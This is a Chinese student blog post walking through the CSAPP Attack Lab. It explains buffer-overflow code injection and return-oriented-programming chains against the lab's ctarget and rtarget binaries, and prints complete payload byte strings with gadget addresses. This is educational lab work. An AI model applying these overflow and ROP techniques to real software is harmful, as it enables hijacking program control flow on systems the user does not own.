---
title: "CSAPPlab3 attacklab通关记录"
date: 2026-06-13
categories: 公开课
tags: CSAPP
top_img: false
---

本文记录了完成attacklab的全流程，编写的辅助信息均在GitHub。

一些重要注意事项：

* **小端序**
* 使用-q启动ctarget/rtarget，因为是自学学生

## ctarget

### Level 1

test调用getbuf，读汇编发现栈上开辟0x28空间，将这些空间填满后再填入touch1的地址（8字节）就好了，通过反汇编获得touch1的第一条指令地址。注意地址要小端序。（信息按字节存储，每个字节内部顺序不变，字节之间逆序）

### Level 2

和第一题的不同点在于调用touch2需要传递一个参数，而我们知道第一个参数放在rdi中，于是思路显然：

* 向栈中注入代码，代码的效果是将rdi赋值为cookie，然后ret。
* test -> getbuf，故getbuf返回，弹出test栈帧中最下方的返回值，覆盖这个返回值为注入代码的地址就调用了我们注入的代码
* 注入代码执行完赋值操作后，执行ret，再弹栈顶地址，将这个地址赋值为touch2的第一条指令的地址即可

但这里会出现栈指针rsp没有16字节对齐的bug。具体的科普可以看这个老哥的文章：[(1 封私信 / 23 条消息) CTFer成长日记12：栈对齐—获取shell前的临门一脚 - 知乎](https://zhuanlan.zhihu.com/p/611961995)，分析的很清晰了，其他人要么没发现错误，要么解释的不好。

最后的解决方案里需要在栈代码的地址和touch2的地址中间加一个ret的地址。

### Level 3

和上一题的不同点在于，test -> getbuf -> touch3 -> hexmatch，hexmatch会使用栈空间，像上一题那样注入代码到缓冲区中的想法会被hexmatch覆盖。

既然往缓冲区注入会被覆盖，那就往更高的地方注入，在更高地址的栈空间~~为所欲为嘿嘿嘿~~。毕竟只要执行我们需要的函数就可以，对其他函数的栈区可以随意搞破坏。

```c
/* 0x5561dcc0 字符串内容
 * 0x5561dcb8 恶意函数内容
 * 0x5561dcb0 touch3地址
 * 0x5561dca8 ret指令地址
 * 0x5561dca0 恶意函数地址
 */
```



## rtarget

### Level 2

核心思想是利用现存代码构造自己的rop链。以及也许现存代码中没有恰好的指令，但是某些指令的一部分可以构成我们需要的指令。

需要把%rdi设为cookie值然后调用touch2。想直接找到 ``48 c7 c7 fa 97 b9 59 c3       mov $0x59b997fa, %rdi``这么完美的指令比较难。根据提示可以用popq，先pop给一个寄存器，然后把这个寄存器的值复制到%rdi即可。在farm中浏览一下，发现rax符合要求。

构造结果如下：

```c
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 /* an address of popq %rax ret */
fa 97 b9 59 00 00 00 00 /* cookie */
a2 19 40 00 00 00 00 00 /* an address of movq %rax, %rdi ret */
ec 17 40 00 00 00 00 00 /* the address of touch2 */
```

进入这个rop链前，rsp为栈中第一个地址，即pop地址，pc指向原本的ret。执行ret，rsp指向栈中第二个地址，pc指向pop的地址。执行pop，rsp指向栈中第三个地址，pc指向ret。执行ret，rsp指向栈中第四个地址，pc指向mov的地址……

### Level 3

与ctarget的Level3相比，不同点在于不能向栈上注入代码以及栈地址随机化了。目标是没变的，找个地方存储字符串，把字符串指针的值赋给%rdi，最后调用touch3。

首先考虑往哪放字符串，肯定还是栈上的高地址（低地址会被后续流程覆盖），在构造的所有rop地址更上面一个位置。也考虑过其他位置，但是其他地方写不进去呀，程序中也没有直接保存这个字符串。

随之而来的问题是如何找到字符串的地址。由于栈地址随机化，每次运行时栈的地址都不一样。但是相对地址是不变的。也就是说栈顶进入rop链的地址，和高处存储字符串的地址的差值，是固定的。获得最初的栈顶地址加上一个自己构造的偏移即是字符串地址。至于偏移量具体是多少，这由我们构造的rop链具体使用了多少栈空间来决定，先把所有gadgets拼好才能知道具体偏移量的值。

这里涉及到了加法操作，要么是addq要么是lea来完成，在farm中发现了唯一的lea指令！~~太伟大了！~~``lea (%rdi, %rsi, 1), %rax``，以这条指令为媒介，执行它之后需要 将%rax移动到%rdi中，执行它之前需要把初始栈顶地址以及偏移量放进%rdi %rsi中，具体对应关系还不确定。接下来就是搜寻合适的指令了，观察发现movq相比movl的指令编码只是多了一字节的前缀，所以搜索movl的更为快捷。最后构造的payload如下：

栈顶地址：rsp -> rax -> rdi（这条链初始数据来自rsp，可以从头往尾找）

偏移量：栈中 -> rax -> edx -> ecx -> esi，（这条链从头往尾找太繁琐了，可能性太多，确定偏移量放在rsi，所以从尾往头找）

```c
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 /* movq %rsp, %rax */
a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
ab 19 40 00 00 00 00 00 /* popq %rax */
48 00 00 00 00 00 00 00 /* the offset is 72 */
dd 19 40 00 00 00 00 00 /* movl %eax, %edx */
34 1a 40 00 00 00 00 00 /* movl %edx, %ecx */
13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */
d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax */
a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
fa 18 40 00 00 00 00 00 /* touch3 */
35 39 62 39 39 37 66 61 00 /* string 59b997fa */
```



## 后记

从栈对齐问题中学到，面对一个问题时，直接面向问题的本质而不是周围的细枝末节。一个continue直接到出错的指令上，然后针对这个指令想办法，比完整模拟一遍函数运行有效率的多。

从已知出发和从问题出发，也可以简化为从头出发和尾出发，解决问题的两个法宝还是发挥着重要作用。
